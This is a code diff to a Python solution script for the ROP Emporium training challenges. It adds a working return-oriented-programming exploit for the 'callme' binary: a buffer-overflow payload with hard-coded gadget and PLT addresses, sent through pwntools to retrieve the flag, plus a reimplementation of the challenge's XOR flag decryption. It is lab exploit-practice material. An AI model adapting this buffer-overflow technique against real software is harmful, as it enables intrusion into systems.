@@ -47,10 +47,63 @@ def split(path):
 
     return True
 
+def __check_decryption_algo():
+    """
+    reimplementation of the decryption algo seen in the "callme" challenge
+    :return: decrypted string
+    """
 
-def callme():
-    pass
+    # content of the file "encrypted_flag.txt"
+    encrypted_flag = b'\x53\x4d\x53\x41\x7e\x67\x58\x78\x65\x6b\x68\x69\x65\x61\x63\x74'
+    encrypted_flag += b'\x74\x60\x4c\x27\x27\x74\x6e\x6c\x7c\x45\x7d\x70\x7c\x79\x3e\x5d'
+    encrypted_flag += b'\x21\x0a'
 
+    # key1.dat and key2.dat contains 0x01 -> 0x10 and 0x11 -> 0x20, respectively. Thus:
+    key = 1
+    decrypted = ''
+    for c in encrypted_flag:
+        if key <= 0x1f:
+            decrypted += chr(c^key)
+            key += 1
+
+    return decrypted
+
+def callme(path):
+
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # buffer
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # RBP
+    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
+    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_one()
+    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_one()
+    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_one()
+    payload += b'\x50\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_one()
+    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
+    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_two()
+    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_two()
+    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_two()
+    payload += b'\x70\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_two()
+    payload += b'\xB0\x1A\x40\x00\x00\x00\x00\x00'  # addr "usefulGadgets()": pop edi, esi, edx, ret
+    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # param1 for callme_three()
+    payload += b'\x02\x00\x00\x00\x00\x00\x00\x00'  # param2 for callme_three()
+    payload += b'\x03\x00\x00\x00\x00\x00\x00\x00'  # param3 for callme_three()
+    payload += b'\x10\x18\x40\x00\x00\x00\x00\x00'  # plt proc callme_three()
+    payload += b'\x97\x1A\x40\x00\x00\x00\x00\x00'  # proper exit
+
+    p = process(path)
+    p.sendline(payload)
+    #p.interactive()
+    raw = p.recv()
+    flag = raw.decode("utf8").split(">")[1].strip() # meh...
+    success(flag)
+
+    # bonus
+    print(__check_decryption_algo())
+
+    return True
 
 def write4():
     pass
@@ -107,7 +160,7 @@ def identify_chall(path):
 
 if __name__ == "__main__":
 
-    # main.py needs to be in the same folder as the file "flag.txt"
+    #  "flag.txt", encrypted things and .so have to be in the ./venv folder
 
     parser = argparse.ArgumentParser(description="Solutions to ROP Emporium challenges")
     parser.add_argument("binary", help="Target binary to exploit")
